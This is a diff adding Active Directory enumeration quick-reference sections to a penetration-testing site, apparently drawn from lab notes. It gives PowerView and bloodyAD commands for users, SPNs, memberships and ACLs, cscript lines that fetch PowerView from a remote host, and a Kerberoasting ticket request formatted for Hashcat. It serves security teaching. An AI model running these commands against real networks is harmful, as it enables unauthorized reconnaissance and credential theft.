@@ -13,6 +13,184 @@ keywords: ["start powerview", "import-module", "PowerView.ps1", "Get-DomainUser"
 
 {/* Generated from Tools/Quick Reference/PowerView - Quick Start.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Ask one directory question at a time
+
+PowerView provides functions for directory objects, group relationships, ACLs and host information. Load the intended module, confirm the available functions, and use an exact identity or distinguished name when a broad query finds something interesting. Different PowerView variants expose different names/options.
+
+### Load and establish the domain context
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-Domain*
+Get-Domain
+Get-DomainController
+Get-DomainTrust
+```
+
+The script path must refer to the reviewed copy already available in the lab. Module loading does not grant directory or host permissions. Keep the current identity and the queried domain/DC with the result.
+
+### Query users, computers and memberships
+
+```powershell
+Get-DomainUser -Identity USERNAME
+Get-DomainUser -SPN
+Get-DomainComputer
+Get-DomainGroup -Identity GROUP_NAME
+Get-DomainGroupMember -Identity GROUP_NAME -Recurse
+```
+
+Read descriptions, SPNs, distinguished names and membership relationships as separate facts. A computer object may be stale or offline. An SPN-bearing account needs the separate Kerberoasting/delegation prerequisite analysis before choosing either branch.
+
+### Resolve an object permission
+
+```powershell
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+```
+
+Resolve the trustee SID and account/group membership. Check whether the right applies to the intended object/attribute and whether it is inherited or constrained. GenericWrite, WriteDACL, WriteOwner and a particular extended right do not mean the same thing.
+
+### Connect host findings to your access
+
+```powershell
+Get-DomainComputer -Identity TARGET_HOST
+Get-DomainUser -Identity USERNAME -Properties samaccountname,memberof,serviceprincipalname,description
+```
+
+Select the attributes you need and inspect them directly. For host-local sessions or administrator checks, first establish connectivity and the permission needed by that query. Directory-read access is not automatically remote administrative access.
+
+### Choose the next branch from evidence
+
+If a group has a useful right, map the nested membership path and resource. If an ACL grants object control, use the ACL guide to identify the exact permissible change. If a service account has an SPN, record its account purpose and relevant privileges. If a trust exists, inspect its direction and resource permissions.
+
+When a function is missing, check the loaded module/variant. When output is empty, distinguish no matching object, wrong domain/identity, omitted property and denied access. Preserve the query and errors so an incomplete collection is not mistaken for an absence of attack paths.
+
+## PowerView: choose the operation and read the result
+
+Import PowerView, then query users, computers and groups.
+
+### What the result establishes
+
+Read object identities, distinguished names, memberships and resolved ACL rights as separate relationships.
+
+### Prerequisites and common failures
+
+PowerView functions require the intended module to be loaded; command names vary between versions, and a listed ACE must be evaluated for effective access.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser -Identity USER
+Get-DomainComputer
+Get-DomainGroupMember -Identity "Domain Admins"
+```
+
+### Example 2: PowerView — Load and Enumerate
+
+Run in: **Saved lab example**.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-DomainUser
+Get-DomainUser -Identity YOUR_USERNAME
+```
+
+Saved context: [PowerView — Load and Enumerate — PowerView — Load and Enumerate](/tools/powerview). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: JavaScript (Windows — cscript.exe)
+
+Run in: **Saved lab example**.
+
+```cmd
+cscript.exe /nologo wget.js http://<IP>/PowerView.ps1 PowerView.ps1
+```
+
+Saved context: [File Transfers for Linux and Windows — JavaScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#javascript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: VBScript (Windows — cscript.exe)
+
+Run in: **Saved lab example**.
+
+```cmd
+cscript.exe /nologo wget.vbs http://<IP>/PowerView.ps1 PowerView.ps1
+```
+
+Saved context: [File Transfers for Linux and Windows — VBScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#vbscript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Request a Ticket for One User
+
+Run in: **Saved lab example**.
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+Saved context: [Kerberoasting from Windows — Request a Ticket for One User](/active-directory/kerberoasting-windows#request-a-ticket-for-one-user). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Import PowerView and Enumerate SPN Users
+
+Run in: **Saved lab example**.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+Saved context: [Kerberoasting from Windows — Import PowerView and Enumerate SPN Users](/active-directory/kerberoasting-windows#import-powerview-and-enumerate-spn-users). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Using Find-InterestingDomainAcl
+
+Run in: **Saved lab example**.
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+```
+
+Saved context: [ACL Enumeration — Using Find-InterestingDomainAcl](/active-directory/acl-enumeration#using-find-interestingdomainacl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## bloodyAD: choose the operation and read the result
+
+Query AD objects and permissions, then use the matching saved ACL procedure.
+
+### What the result establishes
+
+Read the exact object, attribute or membership result and identify the right your principal holds.
+
+### Prerequisites and common failures
+
+Read operations and modifying operations have different consequences; a writable attribute does not imply arbitrary control over the entire domain.
+
+Domain credentials and LDAP connectivity to the DC. For Kerberos, use the options supported by your installed version.
+
+### Example 1: Read an object
+
+Run in: **Kali**.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get object TARGET_OBJECT
+```
+
+### Example 2: Find writable objects
+
+Run in: **Kali**. A writable attribute or object is a specific permission, not automatic domain administrator access.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+```
+
+### Example 3: Inspect memberships
+
+Run in: **Kali**.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
+```
+
+## Existing notes and worked examples
+
 **Run on:** the Windows lab host, in PowerShell, using a domain account with access to the directory. Open the folder containing your saved `PowerView.ps1`:
 
 ```powershell
